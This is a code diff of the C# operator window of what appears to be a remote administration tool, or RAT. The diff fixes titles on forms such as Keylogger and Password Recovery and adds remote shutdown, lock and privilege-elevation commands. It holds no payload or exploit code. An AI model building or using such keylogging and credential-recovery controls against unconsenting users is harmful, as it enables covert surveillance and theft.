@@ -5,8 +5,6 @@ using Serveur.Models;
 using Serveur.Views;
 using System;
 using System.Collections.Generic;
-using System.Runtime.InteropServices;
-using System.Text;
 using System.Threading;
 using System.Windows;
 using System.Windows.Controls;
@@ -57,7 +55,7 @@ namespace MosaicServeur.Main
             if (getClient() != null)
             {
                 FrmSystemInformation frmSi = new FrmSystemInformation(getClient());
-                frmSi.Text = SetWindowTitle("Remote Desktop", getClient());
+                frmSi.Text = SetWindowTitle("System Information", getClient());
                 frmSi.ShowDialog();
                 frmSi.Focus();
             }
@@ -68,7 +66,7 @@ namespace MosaicServeur.Main
             if (getClient() != null)
             {
                 FrmFileManager frmFm = new FrmFileManager(getClient());
-                frmFm.Text = SetWindowTitle("Remote Desktop", getClient());
+                frmFm.Text = SetWindowTitle("File Manager", getClient());
                 frmFm.ShowDialog();
                 frmFm.Focus();
             }
@@ -79,7 +77,7 @@ namespace MosaicServeur.Main
             if (getClient() != null)
             {
                 FrmTaskManager frmTm = new FrmTaskManager(getClient());
-                frmTm.Text = SetWindowTitle("Remote Desktop", getClient());
+                frmTm.Text = SetWindowTitle("Task Manager", getClient());
                 frmTm.ShowDialog();
                 frmTm.Focus();
             }
@@ -90,7 +88,7 @@ namespace MosaicServeur.Main
             if (getClient() != null)
             {
                 FrmStartupManager frmSm = new FrmStartupManager(getClient());
-                frmSm.Text = SetWindowTitle("Remote Desktop", getClient());
+                frmSm.Text = SetWindowTitle("Startup Manager", getClient());
                 frmSm.ShowDialog();
                 frmSm.Focus();
             }
@@ -101,6 +99,7 @@ namespace MosaicServeur.Main
             if (getClient() != null)
             {
                 FrmRegistryEditor frmRe = new FrmRegistryEditor(getClient());
+                frmRe.Text = SetWindowTitle("Registry Editor", getClient());
                 frmRe.Show();
                 frmRe.Focus();
             }
@@ -108,7 +107,11 @@ namespace MosaicServeur.Main
 
         private void RunasMenuItem(object sender, RoutedEventArgs e)
         {
-            new Serveur.Packets.ServerPackets.DoAskElevate().Execute(getClient());
+            if (lvClients.Items.Count != 0)
+            {
+                if (getClient() != null)
+                    new Serveur.Packets.ServerPackets.DoAskElevate().Execute(getClient());
+            }
         }
 
         // Spying Event
@@ -150,7 +153,7 @@ namespace MosaicServeur.Main
             if (getClient() != null)
             {
                 FrmPasswordRecovery frmPr = new FrmPasswordRecovery(getClient());
-                frmPr.Text = SetWindowTitle("Remote Shell", getClient());
+                frmPr.Text = SetWindowTitle("Passord Recovery", getClient());
                 frmPr.ShowDialog();
                 frmPr.Focus();
             }
@@ -161,7 +164,7 @@ namespace MosaicServeur.Main
             if (getClient() != null)
             {
                 FrmKeyLogger frmKl = new FrmKeyLogger(getClient());
-                frmKl.Text = SetWindowTitle("Remote Shell", getClient());
+                frmKl.Text = SetWindowTitle("Keylogger", getClient());
                 frmKl.ShowDialog();
                 frmKl.Focus();
             }
@@ -189,6 +192,7 @@ namespace MosaicServeur.Main
             if(getClient() != null)
             {
                 FrmSendMessageBox frmSndMsgBox = new FrmSendMessageBox(getClient());
+                frmSndMsgBox.Text = SetWindowTitle("Send MessageBox", getClient());
                 frmSndMsgBox.ShowDialog();
                 frmSndMsgBox.Focus();
             }
@@ -199,6 +203,7 @@ namespace MosaicServeur.Main
             if (getClient() != null)
             {
                 FrmRemoteChat frmRChat = new FrmRemoteChat(getClient());
+                frmRChat.Text = SetWindowTitle("Remote Chat", getClient());
                 frmRChat.ShowDialog();
                 frmRChat.Focus();
             }
@@ -208,9 +213,10 @@ namespace MosaicServeur.Main
         {
             if (getClient() != null)
             {
-                FrmPlaySong frmRChat = new FrmPlaySong(getClient());
-                frmRChat.ShowDialog();
-                frmRChat.Focus();
+                FrmPlaySong frmPlaySong= new FrmPlaySong(getClient());
+                frmPlaySong.Text = SetWindowTitle("Play Song", getClient());
+                frmPlaySong.ShowDialog();
+                frmPlaySong.Focus();
             }
         }
 
@@ -248,7 +254,52 @@ namespace MosaicServeur.Main
                 if (getClient() != null)
                     new MosaiqueServeur.Packets.ServerPackets.HideShow(4).Execute(getClient());
             }
-        }       
+        }
+
+        private void shutDownMenuItem(object sender, RoutedEventArgs e)
+        {
+            if (lvClients.Items.Count != 0)
+            {
+                if (getClient() != null)
+                    new MosaiqueServeur.Packets.ServerPackets.Power(1).Execute(getClient());
+            }
+        }
+
+        private void StandbyDownMenuItem(object sender, RoutedEventArgs e)
+        {
+            if (lvClients.Items.Count != 0)
+            {
+                if (getClient() != null)
+                    new MosaiqueServeur.Packets.ServerPackets.Power(2).Execute(getClient());
+            }
+        }
+
+        private void ResetDownMenuItem(object sender, RoutedEventArgs e)
+        {
+            if (lvClients.Items.Count != 0)
+            {
+                if (getClient() != null)
+                    new MosaiqueServeur.Packets.ServerPackets.Power(3).Execute(getClient());
+            }
+        }
+
+        private void LogoutMenuItem(object sender, RoutedEventArgs e)
+        {
+            if (lvClients.Items.Count != 0)
+            {
+                if (getClient() != null)
+                    new MosaiqueServeur.Packets.ServerPackets.ActiveSession(1).Execute(getClient());
+            }
+        }
+
+        private void LockMenuItem(object sender, RoutedEventArgs e)
+        {
+            if (lvClients.Items.Count != 0)
+            {
+                if (getClient() != null)
+                    new MosaiqueServeur.Packets.ServerPackets.ActiveSession(2).Execute(getClient());
+            }
+        }
 
         /// :: GET CLIENT FROM DATAGRIDVIEW :: ///
         public ClientMosaique getClient()
@@ -419,6 +470,6 @@ namespace MosaicServeur.Main
         public static int connectedClients()
         {
             return clientsCount;
-        }        
+        }
     }    
 }
